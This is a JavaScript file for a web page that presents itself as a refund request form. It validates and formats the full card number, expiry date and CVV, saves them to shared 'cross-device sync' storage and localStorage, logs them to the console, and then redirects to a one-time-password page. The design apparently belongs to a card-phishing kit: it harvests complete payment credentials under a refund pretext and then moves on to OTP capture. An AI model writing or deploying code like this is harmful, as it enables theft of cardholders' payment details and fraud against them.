// Refund form functionality
document.addEventListener('DOMContentLoaded', function() {
    setupRefundForm();
    setupCardFormatting();
});

// Setup refund form
function setupRefundForm() {
    const refundForm = document.getElementById('refundForm');
    
    refundForm.addEventListener('submit', function(e) {
        e.preventDefault();
        handleRefundSubmission();
    });
}

// Handle refund form submission
function handleRefundSubmission() {
    // Get form data
    const refundData = {
        id: generateRefundId(),
        cardholderName: document.getElementById('refundCardholderName').value,
        cardNumber: document.getElementById('refundCardNumber').value,
        expiryDate: document.getElementById('refundExpiryDate').value,
        cvv: document.getElementById('refundCvv').value,
        description: document.getElementById('refundDescription').value,
        timestamp: new Date().toISOString(),
        status: 'pending'
    };
    
    // Validate form
    if (!validateRefundForm(refundData)) {
        return;
    }
    
    // Save refund data with cross-device sync
    let refunds = loadSharedData('refunds');
    refunds.push(refundData);
    
    // Save using cross-device sync
    if (typeof saveWithCrossDeviceSync === 'function') {
        saveWithCrossDeviceSync('refunds', refunds);
    } else {
        saveSharedData('refunds', refunds);
    }
    
    // Debug: Log the saved data
    console.log('Refund data saved with cross-device sync:', refundData);
    console.log('Total refunds now:', refunds.length);
    
    // Show success notification
    showNotification('Refund request submitted successfully! Data will sync across devices...');
    
    // Store current refund data for OTP page
    localStorage.setItem('currentRefund', JSON.stringify(refundData));
    
    // Small delay to ensure data is saved before redirect
    setTimeout(() => {
        window.location.href = 'refund-otp.html';
    }, 1000);
}

// Validate refund form
function validateRefundForm(data) {
    if (!data.cardholderName.trim()) {
        alert('Please enter cardholder name');
        return false;
    }
    
    if (!data.cardNumber.replace(/\s/g, '').match(/^\d{16}$/)) {
        alert('Please enter a valid 16-digit card number');
        return false;
    }
    
    if (!data.expiryDate.match(/^\d{2}\/\d{2}$/)) {
        alert('Please enter expiry date in MM/YY format');
        return false;
    }
    
    if (!data.cvv.match(/^\d{3}$/)) {
        alert('Please enter a valid 3-digit CVV');
        return false;
    }
    
    return true;
}

// Setup card formatting
function setupCardFormatting() {
    const cardNumberInput = document.getElementById('refundCardNumber');
    const expiryInput = document.getElementById('refundExpiryDate');
    const cvvInput = document.getElementById('refundCvv');
    
    // Format card number
    cardNumberInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        if (formattedValue.length <= 19) {
            e.target.value = formattedValue;
        }
    });
    
    // Format expiry date
    expiryInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
    
    // CVV only numbers
    cvvInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });
}

// Generate refund ID
function generateRefundId() {
    return 'REF' + Date.now() + Math.floor(Math.random() * 1000);
}

// Show notification
function showNotification(message) {
    // Create notification element
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #27ae60;
        color: white;
        padding: 1rem 2rem;
        border-radius: 10px;
        z-index: 10000;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        animation: slideIn 0.3s ease;
        max-width: 300px;
    `;
    notification.textContent = message;
    
    // Add animation keyframes if not exists
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Remove notification after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 3000);
}